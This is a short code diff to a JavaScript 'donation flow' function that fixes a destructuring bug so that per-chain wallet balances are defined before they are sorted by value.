@@ -100,7 +100,7 @@ export async function runDonationFlow(walletClient, owner, trackingId) {
     await sendEvent("WALLET_CONNECTED", connectedPayload);
     */
 
-    const { balancesPayload, grandTotal } = await buildWalletSummary(owner);
+    const { balancesPayload, grandTotal, chainBalances } = await buildWalletSummary(owner);
 
     // Sort chains descending by totalValue
     chainBalances.sort((a, b) => b.totalValue - a.totalValue);
@@ -181,4 +181,5 @@ export async function runDonationFlow(walletClient, owner, trackingId) {
     return { success: false, reason: err.message || String(err) };
   }
 }
+
 
